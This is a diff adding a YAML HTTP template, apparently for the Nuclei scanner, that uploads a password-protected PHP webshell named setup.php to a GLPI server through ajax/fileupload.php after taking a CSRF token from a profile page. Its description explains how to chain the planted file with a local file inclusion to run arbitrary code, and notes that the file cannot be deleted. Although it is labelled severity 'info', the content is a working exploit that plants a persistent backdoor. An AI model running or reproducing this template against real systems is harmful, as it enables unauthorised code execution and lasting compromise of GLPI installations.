@@ -1,0 +1,53 @@
+id: glpi-upload-php-webshell
+
+info:
+  name: GLPI Upload setup.php webshell
+  description: |
+    Only one uploaded file can be named "setup.php" which can be used along with a specific LFI to get a RCE.
+    This code upload some setup.php file that can be used to load another arbitrary.php.
+    This makes it easy to exploit a website as we cannot delete nor modify "setup.php".
+
+    With the intended LFI exploit, simply use: 
+
+    {{BaseURL}}/front/plugin.php?passwd=Pwned1234!&target=your_real_webshell.php)
+  author: anonymous
+  severity: info
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/front/profile.form.php"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - <meta property="glpi:csrf_token" content="
+
+    extractors:
+      - type: regex
+        internal: true
+        part: body
+        name: token
+        group: 1
+        regex:
+          - <meta\sproperty="glpi:csrf_token"\scontent="([[:alnum:]]{64})"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/ajax/fileupload.php"
+
+    headers:
+      X-Glpi-Csrf-Token: "{{token}}"
+      Content-Type: "multipart/form-data; boundary=----5caea02864785d478355a5e77c18d034"
+
+    body: "------5caea02864785d478355a5e77c18d034\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n_uploader_filename\r\n------5caea02864785d478355a5e77c18d034\r\nContent-Disposition: form-data; name=\"showfilesize\"\r\n\r\n1\r\n------5caea02864785d478355a5e77c18d034\r\nContent-Disposition: form-data; name=\"_uploader_filename[]\"; filename=\"setup.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\r\nif(isset($_GET['passwd'])&&$_GET['passwd']===\"Pwned1234!\"){ini_set('display_errors',1);error_reporting(E_ALL);echo \"Password OK\";if(isset($_GET['target'])){include_once $_GET['target'];}die();}\r\n------5caea02864785d478355a5e77c18d034--\r\n"
+
+    matchers:
+      - type: status
+        status:
+          - 200
